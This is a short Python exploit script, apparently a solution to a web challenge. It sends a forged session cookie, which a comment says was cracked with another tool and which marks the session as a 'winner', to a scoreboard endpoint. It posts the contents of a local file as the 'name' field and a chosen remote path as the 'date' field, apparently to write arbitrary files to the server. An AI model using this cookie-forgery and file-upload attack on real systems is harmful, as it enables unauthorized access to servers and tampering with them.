import requests
import sys

# Obtained with crack.py
session_cookie='eyJpZCI6NjM0MjY2LCJzb2x1dGlvbiI6WzMsMTYsMjYsNDYsNDddLCJzdGF0ZSI6Indpbm5lciJ9.ZFhAhg.U7B-uK1Fj2MFk69pyfh1qP0Q9gQ'
target_url='https://superxwebdeveloper.epizeuxis.net/scoreboard'

def main():
    if len(sys.argv)!=3:
        print(f"Usage: {sys.argv[0]} (remote_destination) (local_file)")
        return
    
    with open(sys.argv[2], 'r') as payload :
        payload_txt = payload.read()

        resp = requests.post(
            url=target_url,
            cookies={'session': session_cookie},
            data={'date': sys.argv[1], 'name': payload_txt}
        )

        if resp.status_code != 200:
            print("Failed to upload file!")
        else:
            print("File successfully uploaded!")

if __name__=="__main__":
    main()